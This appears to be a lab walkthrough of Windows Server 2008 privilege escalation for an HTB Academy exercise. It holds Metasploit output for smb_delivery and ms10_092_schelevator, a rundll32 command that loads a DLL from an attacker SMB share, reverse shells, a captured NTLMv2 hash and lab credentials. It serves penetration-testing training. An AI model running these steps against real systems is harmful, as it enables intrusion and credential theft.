Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.


## Server 2008 vs. Newer Versions

The table below shows some notable differences between Server 2008 and the latest Windows Server versions.

|Feature|Server 2008 R2|Server 2012 R2|Server 2016|Server 2019|
|---|---|---|---|---|
|[Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection)||||X|
|[Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)|Partial|Partial|X|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)|||X|X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)|||X|X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)|||X|X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|X|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|Partial|X|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)|||X|X|
**Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop.**

Note: If xfreerdp gives you errors, try using rdesktop -u htb-student -p HTB_@cademy_stdnt! [IP Address]

run  Sherlock.ps1 in the powershell to find the vulnerabilities.

```
ploit(windows/smb/smb_delivery) > show options

Module options (exploit/windows/smb/smb_delivery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default: none)
   JOHNPWFILE                    no        Name of file to store JohnTheRipper hashes in. Supp
                                           orts NTLMv1 and NTLMv2 hashes, each of which is sto
                                           red in separate files. Can also be a path.
   SHARE                         no        Share (Default: random); cannot contain spaces or s
                                           lashes
   SRVHOST      10.10.15.187     no        The local host to listen on and use for incoming co
                                           nnections.
   SRVPORT      445              yes       The local port to listen on.
   SRVSSL       false            no        Negotiate SSL/TLS for local server connections


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     10.10.15.187     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DLL



View the full module info with the info, or info -d command.

msf exploit(windows/smb/smb_delivery) > run
[*] Exploit running as background job 3.

```

```
msf exploit(windows/smb/smb_delivery) > [*] Server is running. Listening on 10.10.15.187:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.15.187\ycbOra\test.dll,0
[SMB] NTLMv2-SSP Client     : 10.129.59.118
[SMB] NTLMv2-SSP Username   : WINLPE-2K8\htb-student
[SMB] NTLMv2-SSP Hash       : htb-student::WINLPE-2K8:0297a202f1c2acdf:9dd837e0809270c49c9049e873aa85c5:0101000000000000808d877f9512dd013ec5e1dce4b75971000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f005500500007000800808d877f9512dd010600040002000000080030003000000000000000000000000020000027c849de5b601dfeb16b6c177eb9da374c5dbd96566123f5875b02c62d1afd490a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310038003700000000000000000000000000

[*] Sending stage (199238 bytes) to 10.129.59.118
[*] Meterpreter session 2 opened (10.10.15.187:4444 -> 10.129.59.118:49159) at 2026-07-13 12:33:24 +0530


```

```
] 10.129.59.118 - Command shell session 3 closed.  Reason: User exit
msf exploit(windows/local/ms10_092_schelevator) > run
[*] Started reverse TCP handler on 10.10.15.187:4443 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Preparing payload at C:\Users\HTB-ST~1\AppData\Local\Temp\2\NSjoisv.exe
[*] Creating task: Am9DWrUJGnuRC
[*] Reading the task file contents from C:\Windows\system32\tasks\Am9DWrUJGnuRC...
[*] Original CRC32: 0xbec1d566
[*] Final CRC32: 0xbec1d566
[*] Writing our modified content back...
[*] Validating task: Am9DWrUJGnuRC
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "Am9DWrUJGnuRC" have been changed.
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "Am9DWrUJGnuRC" have been changed.
[*] Executing the task...
[*] Sending stage (240 bytes) to 10.129.59.118
[*] Command shell session 4 opened (10.10.15.187:4443 -> 10.129.59.118:49161) at 2026-07-13 12:43:24 +0530
[*] Deleting task Am9DWrUJGnuRC...


Shell Banner:
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
-----
          

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>cd users
cd users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 62FA-4C11

 Directory of C:\Users\Administrator\Desktop

06/04/2021  06:07 PM    <DIR>          .
06/04/2021  06:07 PM    <DIR>          ..
06/04/2021  06:12 PM                24 flag.txt
               1 File(s)             24 bytes
               2 Dir(s)  30,492,311,552 bytes free

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt

```
